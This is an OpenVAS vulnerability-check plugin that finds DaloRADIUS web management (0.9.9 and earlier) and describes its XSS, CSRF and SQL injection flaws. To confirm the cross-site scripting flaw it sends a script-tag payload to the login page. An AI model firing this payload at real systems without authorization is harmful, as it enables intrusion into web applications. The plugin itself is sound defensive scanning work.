###############################################################################
# OpenVAS Vulnerability Test
#
# DaloRADIUS Web Management Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803183");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2013-03-18 12:29:46 +0530 (Mon, 18 Mar 2013)");
  script_name("DaloRADIUS Web Management Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120828/");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/daloradius-csrf-xss-sql-injection");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML or web script in a user's browser session in context of an affected site,
  compromise the application and access or modify data in the database.");

  script_tag(name:"affected", value:"DaloRADIUS version 0.9.9 and prior");

  script_tag(name:"insight", value:"- The acct-ipaddress.php script not properly sanitizing user-supplied
  input to the 'orderBy' and 'ipaddress' parameters.

  - The application does not require multiple steps or explicit confirmation
  for sensitive transactions.

  - The application does not validate the 'username' parameter upon submission
  to the mng-search.php script and does 'daloradiusFilter' parameter upon
  submission to the rep-logs-daloradius.php script.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with DaloRADIUS Web Management and is
  prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/radius", "/daloradius", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/login.php"), port:port);

  if(">daloRADIUS<" >< rcvRes && "> daloRADIUS Copyright" >< rcvRes)
  {

    postdata = "operator_user=%3Cscript%3Ealert%28document.cookie%29%3C%2" +
               "Fscript%3E&operator_pass=&location=default";

    url = dir  + "/dologin.php";

    req = string("POST ", url , " HTTP/1.1\r\n",
                 "Host: ", host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    rcvRes = http_keepalive_send_recv(port:port, data:req);

    if(rcvRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< rcvRes &&
       "radius.operators" >< rcvRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
